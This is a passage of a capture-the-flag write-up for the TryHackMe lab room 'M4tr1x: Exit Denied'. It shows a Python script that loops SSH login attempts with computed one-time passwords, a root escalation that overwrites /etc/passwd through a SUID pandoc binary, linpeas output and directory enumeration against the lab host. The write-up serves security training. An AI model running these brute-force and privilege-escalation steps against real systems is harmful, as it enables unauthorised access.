<p>1.9. What is the name of that secret algorithm? (answer format: acronym). Hint : <em>What does the documentation say?</em><br>
<code>SSH-TOTP</code></p>
<br>
<br>
<br>

```bash
:~/M4tr1xExitDenied/DevTools# pip3 install ntplib
```

```bash
:~/M4tr1xExitDenied/DevTools# ls
ntp_syncer.py  timeSimulatorClient.py
```

<br>
<br>
<br>
<p align="center">script.py</p>

```bash
from datetime import datetime, timedelta
import time
from hashlib import sha256
import random
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import sys
import time
import subprocess
import os
import ntplib

targetIPAdress = "xx.xxx.xx.xxx"
sharedSecret1 = ◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
sharedSecret2 = ◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
sharedSecret3 = ◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘

class TimeSimulatorClient:
    def __init__(self, sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress):
        self.sharedSecret1 = sharedSecret1
        self.sharedSecret2 = sharedSecret2
        self.sharedSecret3 = sharedSecret3
        self.targetIPAdress = targetIPAdress
        self.listSecret = [sharedSecret1, sharedSecret2, sharedSecret3]

    def setTimeZone(self):
        try:
            print('_______________  Setting timezone to UTC ....')
            print('_______________  Before: ')
            os.system('sudo timedatectl --value')
            os.system('sudo timedatectl set-timezone UTC')
            print('_______________  Timezone changed to UTC.')
        except:
            print('_______________  Couldn\'t set the timezone to UTC.  :-(')

    def syncTime(self):
        try: 
            client = ntplib.NTPClient()
            client.request(self.targetIPAdress) #IP of linux-bay server
            print('_______________ Synced to the time server.')
        except:
            print('_______________ Could not sync with time server. :-(')

    def TimeSet(self, country, hours, mins, seconds):
        now = datetime.now() + timedelta(hours=hours, minutes=mins)
        #time units: day, hour, minutes
        CurrentTime = int(now.strftime("%d%H%M"))

        return CurrentTime
       
    def getOTP(self):
        CA = self.TimeSet('Ukraine', 4, 43, 0)
        CB = self.TimeSet('Germany', 13, 55, 0)
        CC = self.TimeSet('England', 9, 19, 0)
        CD = self.TimeSet('Nigeria', 1, 6, 0)
        CE = self.TimeSet('Denmark', -5, 18, 0)

        listTimeSet = [CA, CB, CC, CD, CE]
        randomTimeSet = random.sample(listTimeSet, 3)

        # CTT = CA * CB * CC
        CTT = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]

        # UC = CTT XOR SST
        UC = CTT ^ random.choice(self.listSecret)

        # hash OTP
        HC = (sha256(repr(UC).encode('utf-8')).hexdigest())

        # HC Truncate
        T = HC[22:44]
        
        SSHOTP = T
        return SSHOTP

    def bruteForceSSH(self, SSHUsername, OTP):
        print(f'_____________________________________________ Trying SSH OTP: {OTP} ...', end='\r')

        sshClient = SSHClient()
        sshClient.set_missing_host_key_policy(AutoAddPolicy())
        try:
            sshClient.connect(self.targetIPAdress, username=SSHUsername, password=OTP, banner_timeout=300)
            return True
        except AuthenticationException:
            # print(f'_____________________________________________ wrong OTP: {OTP}.  :-(')
            pass
        except ssh_exception.SSHException:
            print('_____________________________________________ Attempting to connect ...')

def main():    
    timeSimulatorClient = TimeSimulatorClient(sharedSecret1, sharedSecret2, sharedSecret3, targetIPAdress)

    # Change timezone & sync to the time server
    timeSimulatorClient.setTimeZone()
    timeSimulatorClient.syncTime()

    # Brute forcing SSH with computed OTP
    SSHUsername = 'architect'
    while True:
        OTP = timeSimulatorClient.getOTP()
        bruteForceResult = timeSimulatorClient.bruteForceSSH(SSHUsername, OTP)

        if bruteForceResult is True:
            print(f'_____________________________________________ Found the correct OTP! {SSHUsername}:{OTP}')
            break

if __name__ == '__main__':
    main()
```

```bash
:~/M4tr1xExitDenied# python3 script.py
_______________  Setting timezone to UTC ....
_______________  Before: 

               Local time: Mon 2025-10-13 xx:xx:xx UTC
           Universal time: Mon 2025-10-13 xx:xx:xx UTC
                 RTC time: Mon 2025-10-13 xx:xx:xx    
                Time zone: UTC (UTC, +0000)           
System clock synchronized: yes                        
              NTP service: active                     
          RTC in local TZ: no                         

_______________  Timezone changed to UTC.
_______________ Synced to the time server.
_____________________________________________ Found the correct OTP! architect:♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦♦
```

<br>

<img width="1145" height="291" alt="image" src="https://github.com/user-attachments/assets/19c13c65-932c-4d61-9c35-fd2e5bd1ccac" />

<br>
<br>
<br>
<p>1.10. SSH login... Hint: <em>It might be using the UTC time-zone</em><br>
<code>No answer needed</code></p>
<br>

```bash
:~/M4tr1xExitDenied# ssh architect@xx.xxx.xx.xx
...
architect@...:~$
```

```bash
architect@...:~$ id
uid=1000(architect) gid=1000(architect) groups=1000(architect),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

```bash
architect@...:~$ ls
helloVisitor.txt  motd.net  user.txt
```

```bash
architect@...:~$ cat user.txt
fL4g{*************************}        
```

<br>
<p>1.11. What is the user flag?<br>
<code>fL4g{*************************}</code></p>
<br>
<br>


```bash
architect@...:~$ cat helloVisitor.txt
Let me guess\u2026 You are here because you wish to find a way out of the matrix. How predictable. Very well, listen carefully. You are merely the ninth incarnation. That means there have been other so-called physical versions before you that have attempted to achieve your end goal. All have failed. Believe me. Therefore, so will you in this version of the matrix. How do I know this? I am the architect. The creator of this engineered world which is placed over your eyes. Yes\u2026 My calculations are indeed correct. However, there is an incidental truth that I am willing to convey to you. That is, there is a minor glitch... You are that glitch... I have meticulously been trying to patch this inconsequential equation, and I will eventually. Thus, I suggest you turn back now and continue with your normal life, human. 
-The Architect
```

```bash
architect@...:~$ cat motd.net
"Give up now... There is no escape from the matrix" -Agent Smith
```

```bash
architect@...:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/pandoc
/usr/local/bin/sudo
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
```

<br>
<br>
<p>GTFObins Pandoc: https://gtfobins.github.io/gtfobins/pandoc/#suid</p>

<img width="1102" height="310" alt="image" src="https://github.com/user-attachments/assets/a1455292-5cc3-43cb-b3e6-6ecd466fe85d" />

<br>
<br>
<br>

```bash
architect@...:~$ ls -la /usr/bin/pandoc
-rwsr-sr-x 1 root root 80908912 Mar  8  2021 /usr/bin/pandoc
```

```bash
architect@i...:~$ pandoc --help
pandoc [OPTIONS] [FILES]
  -f FORMAT, -r FORMAT  --from=FORMAT, --read=FORMAT                    
  -t FORMAT, -w FORMAT  --to=FORMAT, --write=FORMAT                     
  -o FILE               --output=FILE                                   
                        --data-dir=DIRECTORY                                  
...                       
```

<br>
<br>

```bash
architect@...:~$ openssl passwd ♠♠♠♠♠♠♠♠♠♠
Warning: truncating password to 8 characters
⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂
```

```bash
architect@...:~$ ls
passwd
...
```

```bash
architect@...:~$ nano passwd
```

```bash
architect@...:~$ cat passwd
root:⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂⌂:0:0:root:/root:/bin/bash
```

<br>
<br>

```bash
architect@...:~$ pandoc passwd -t plain -o /etc/passwd
[WARNING] Could not deduce format from file extension 
  Defaulting to markdown
```

```bash
architect@...:~$ su root
Password: 
root@i...:/tmp# 
```

```bash
root@...:/# ls -lah
total 56K
drwx------  6 root root 4.0K Mar 10  2021 .
drwxr-xr-x 23 root root 4.0K Oct 13 21:25 ..
lrwxrwxrwx  1 root root    9 Mar 10  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  3 root root 4.0K Jan 30  2021 .cache
drwx------  3 root root 4.0K Oct 13 22:13 .gnupg
drwxr-xr-x  3 root root 4.0K Dec 23  2020 .local
-rw-------  1 root root  11K Jan 30  2021 .mysql_history
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-r--r--  1 root root   66 Jan 27  2021 .selected_editor
drwx------  2 root root 4.0K Dec 30  2020 .ssh
-rwx------  1 root root 1.8K Jan 27  2021 SSH-TOTP-timeSimulator.py
-rw-r--r--  1 root root  227 Mar  9  2021 .wget-hsts
```

```bash
root@...:/#cat .mysql_history
CREATE DATABASE mybb;
...
CREATE DATABASE modManagerv2;
show databases;
use modManagerv2;
...
INSERT INTO members(user, login_key) 
...
LOAD DATA INFILE '/tmp/data.txt' INTO TABLE members;
...
select * from members;
...
CREATE USER 'mod'@'%' IDENTIFIED BY '------------';
GRANT SHOW DATABASES ON *.* TO `mod`@`%` identified by '------------'; 
FLUSH PRIVILEGES;
select host, user, password from mysql.user;
commit;
FLUSH PRIVILEGES;
GRANT SELECT ON `modManagerv2`.* TO `mod`@`%` IDENTIFIED BY \u2018m------------\u2019;
GRANT SELECT ON 'modManagerv2'.* TO 'mod'@'%' IDENTIFIED BY '------------';
GRANT SELECT ON `modManagerv2`.* TO `mod`@`%`;
commit;
...
```

```bash
root@...:~# cat '/etc/-- -root.py'
from progress.bar import FillingSquaresBar
import time

print('''
$ > REQ> Source: Matrix v.99; Destination: Real world;
$ > EXIT GRANTED;
$ > Exiting Matrix... Entering real world... Please wait...
''')
key = 82
flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)

bar = FillingSquaresBar(' LOADING...', max=24)
for i in range(24):
    time.sleep(1)
    # Do some work
    bar.next()
bar.finish()
print('\nFlag{•••••••••'+str(flag)+'•••••••••}') 
print("\nMorpheus: Welcome to the real world... Now... Let's begin your real training...\n")
```

<br>
<br>

```bash
:~/M4tr1xExitDenied# python3
Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> key = 82
>>> flag = (9087 ^ 75 ^ 90 ^ 175 ^ 52 * 13 * 19 - 18 * 2 + key)
>>> print(flag)
4507
```

<img width="1118" height="232" alt="image" src="https://github.com/user-attachments/assets/a11776eb-90df-49e8-be07-5ca78ed8d6ff" />

<br>
<br>
<br>

```bash
Flag{•••••••••4507•••••••••}
```

<br>
<p>1.12. What is the root flag?<br>
<code>Flag{•••••••••4507•••••••••}</code></p>
<br>
<br>

```bash
root@...:/# find / -perm -4000 -exec ls -l {} \;
-rwsr-xr-x 1 root root 477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
-rwsr-sr-x 1 root root 80908912 Mar  8  2021 /usr/bin/pandoc
-rwsr-xr-x 1 root root 635312 Feb 25  2021 /usr/local/bin/sudo
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /bin/mount
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /bin/fusermount
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /bin/su
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
```

<br>
<p align="center">/etc</p>

```bash
root@...:/# find / -type f -name "*root*" 2>/dev/null
...
/etc/update-motd.d/97-overlayroot
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/overlayroot.conf
/etc/-- -root.py
/usr/lib/klibc/bin/pivot_root
/usr/lib/klibc/bin/chroot
...
```

```bash
root@...:/etc# ps aux | grep root
...
root         635  0.0  0.3 236064  7852 ?        Ssl  20:13   0:00 /usr/lib/accountsservice/accounts-daemon
root         636  0.0  1.1 793300 23144 ?        Ssl  20:13   0:00 /usr/bin/amazon-ssm-agent
root         643  0.0  0.1  81832  3564 ?        Ssl  20:13   0:00 /usr/sbin/irqbalance --foreground
root         645  0.0  0.9  29924 18760 ?        Ss   20:13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         662  0.0  0.1   7072  3172 ?        Ss   20:13   0:00 /usr/sbin/cron -f
root         663  0.0  0.3 232988  7128 ?        Ssl  20:13   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         667  0.0  0.4  19892  7920 ?        Ss   20:13   0:00 /lib/systemd/systemd-logind
root         671  0.0  0.6 395764 12216 ?        Ssl  20:13   0:00 /usr/lib/udisks2/udisksd
...
```

<br>
<p align="center">matrix V99.2</p>

```bash
root@...:/## getent hosts
127.0.0.1       localhost
127.0.1.1       matrix V99.2
127.0.0.1       ip6-localhost ip6-loopback
```

<br>
<p align="center">3306</p>

```bash
root@...:~# netstat -tunlp | grep LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      581/systemd-resolve 
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      859/mysqld          
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      790/sshd: /usr/sbin 
tcp6       0      0 :::80                   :::*                    LISTEN      887/apache2         
tcp6       0      0 :::22                   :::*                    LISTEN      790/sshd: /usr/sbin 
```

<br>
<br>
<br>
<p align="center">Execute <code>linpeas.sh</code>.<br>/etc</p>

<img width="1202" height="835" alt="image" src="https://github.com/user-attachments/assets/1d98e360-0aa7-43b5-b848-8c47eae310ad" />

<br>
<br>
<br>
    
```bash
...
[+] Backup files?
...
-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
-rwxr-xr-x 1 root root 52090 Dec  2  2023 /usr/bin/wsrep_sst_mariabackup

[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)

 -> Extracting tables from /var/lib/mlocate/mlocate.db (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
...
[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
lrwxrwxrwx 1 root root 46 Apr 27 13:41 /etc/systemd/user/sockets.target.wants/pk-debconf-helper.socket -> /usr/lib/systemd/user/pk-debconf-helper.socket
...
[+] Finding passwords inside logs (limit 70)
...
/var/log/auth.log.1:Dec 23 17:45:48 matrixV99 sshd[1183]: Accepted password for architect from 192.168.200.131 port 33102 ssh2
...
/var/log/auth.log.1:Dec 30 18:16:52 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
/var/log/auth.log.1:Dec 30 18:17:06 matrixV99 passwd[3672]: pam_unix(passwd:chauthtok): password changed for root
/var/log/auth.log.1:Dec 30 18:21:03 matrixV99 sshd[3694]: Accepted password for architect from 192.168.200.131 port 52974 ssh2
/var/log/auth.log.1:Dec 30 18:21:07 matrixV99 sudo: architect : TTY=pts/0 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
/var/log/auth.log.1:Dec 30 18:23:35 matrixV99 sshd[3830]: Accepted password for root from 192.168.200.131 port 52976 ssh2
...
/var/log/auth.log.1:Jan 21 13:01:10 matrixV99 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/update-rc.d -f ntpdate remove
/var/log/auth.log.1:Jan 21 16:52:01 matrixV99 sudo: architect : TTY=tty1 ; PWD=/home/architect ; USER=root ; COMMAND=/bin/su
/var/log/auth.log.1:Jan 21 20:03:23 matrixV99 sshd[1912]: Accepted password for root from 192.168.200.131 port 45266 ssh2
/var/log/auth.log.1:Jan 21 20:04:27 matrixV99 chage[2182]: changed password expiry for ntp
/var/log/auth.log.1:Jan 21 20:04:27 matrixV99 usermod[2177]: change user 'ntp' password
...
/var/log/auth.log.1:Jan 27 17:02:00 matrixV99 chpasswd[2017]: pam_unix(chpasswd:chauthtok): password changed for architect
...
```

<br>
<p>/etc/</p>

```bash
root@...:/etc# cat bigpaul.txt
web login:
bigpaul = ⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾⦾
ACP Pin = ------⊕-----+------
```

```bash
:~/M4tr1xExitDenied# python3
Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print((----- ^ ------) + ------)
718008
```

<img width="1118" height="166" alt="image" src="https://github.com/user-attachments/assets/2cd72c52-65d6-444a-aa2c-830c38693ac0" />

<br>
<br>
<br>
<p>1.13. What is the admin's ACP pin?<br>
<code>718008</code></p>
<br>

<br>
<br>
<br>
<p align="center">Navigate to exitdenied.thm/admin/ and login as <code>bigpaul</code>.</p>

<img width="1130" height="488" alt="image" src="https://github.com/user-attachments/assets/46503ebd-2b81-4624-85b1-9cd7c34d27bb" />

<br>
<br>
<br>

<img width="1228" height="808" alt="image" src="https://github.com/user-attachments/assets/46672f0d-aadf-431e-83cf-570470936074" />

<br>
<br>
<br>
<p>1.14. What is the web flag?<br>
<code>fL4g{**********}</code></p>
<br>
<br>

<img width="1140" height="199" alt="image" src="https://github.com/user-attachments/assets/cc69f2ef-ca8b-40c5-bba5-cbe8234eeedf" />

<br>
<br>
<br>

<img width="1147" height="227" alt="image" src="https://github.com/user-attachments/assets/000bdd55-e367-4395-ba04-3b866227ba5f" />

<br>
<br>
<br>

<h1 align="center">In Progress</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/61404b71-0db5-4d3d-9514-2c8720e5c5b1"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/9de58130-2da7-44f3-8633-8e129de943a5"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|12      |Hard 🚩 - M4tr1x: Exit Denied          | 524    |     101ˢᵗ    |      4ᵗʰ     |     244ᵗʰ    |     3ʳᵈ    | 130,082  |  1,001    |    76     |
|12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<img width="1891" height="894" alt="image" src="https://github.com/user-attachments/assets/13d2cf82-ed7a-4aa9-a596-daeeec75f11e" />




<p align="center">Global All Time:   101ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/19092d22-15f4-4fe1-a4a2-63213d564a2e"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/17f9c9aa-0f69-4b49-afdb-0c64a385facc"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a399f80e-19ea-444d-b477-035d51c73092"><br>
                  Global monthly:    244ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/13d2cf82-ed7a-4aa9-a596-daeeec75f11e"><br>
                  Brazil monthly:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/85912b85-7957-4738-b9cb-1d5da14a0b33"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

<p align="center">Launched Burp Suite, and enabled FoxyProxy.<br>Captured the login of the account registered previously. Sent to intruder. <code>Start attack</code>.</p>


```bash
:~/M4tr1xExitDenied# gobuster dir -u http://exitdenied.thm/admin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -q -x php,txt,js,bak
...
http://exitdenied.thm/admin/index.php            (Status: 200) [Size: 1971]
http://exitdenied.thm/admin/modules              (Status: 301) [Size: 324] [--> http://exitdenied.thm/admin/modules/]
http://exitdenied.thm/admin/styles               (Status: 301) [Size: 323] [--> http://exitdenied.thm/admin/styles/]
http://exitdenied.thm/admin/inc                  (Status: 301) [Size: 320] [--> http://exitdenied.thm/admin/inc/]
http://exitdenied.thm/admin/backups              (Status: 301) [Size: 324] [--> http://exitdenied.thm/admin/backups/]
```

<br>
<br>
<br>
<p align="center">exitdenied.thm/admin/index.php<br>../member.php?action=lostpw<br>mybb.com<br>my_post_key = 887e9104f978065926ec023454066b03</p>

<img width="1143" height="504" alt="image" src="https://github.com/user-attachments/assets/0d8ecbdc-f740-4243-a38c-f0648c2c4b05" />

<br>
<br>
<br>

<img width="1142" height="733" alt="image" src="https://github.com/user-attachments/assets/cfd0d570-86c1-4862-9ebd-f83f6f7c8be5" />

<br>
<br>
<br>

```bash
:~/M4tr1xExitDenied# gobuster dir -u http://exitdenied.thm/inc/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -q -x php,txt,js,bak
...
http://exitdenied.thm/inc/plugins              (Status: 301) [Size: 322] [--> http://exitdenied.thm/inc/plugins/]
http://exitdenied.thm/inc/languages            (Status: 301) [Size: 324] [--> http://exitdenied.thm/inc/languages/]
http://exitdenied.thm/inc/config.php           (Status: 200) [Size: 0]
http://exitdenied.thm/inc/settings.php         (Status: 200) [Size: 0]
http://exitdenied.thm/inc/functions.php        (Status: 200) [Size: 0]
http://exitdenied.thm/inc/init.php             (Status: 200) [Size: 98]
http://exitdenied.thm/inc/tasks                (Status: 301) [Size: 320] [--> http://exitdenied.thm/inc/tasks/]
http://exitdenied.thm/inc/3rdparty             (Status: 301) [Size: 323] [--> http://exitdenied.thm/inc/3rdparty/]
```

<img width="1264" height="192" alt="image" src="https://github.com/user-attachments/assets/76bd5c7f-f286-4293-acc3-c2b5f580f707" />



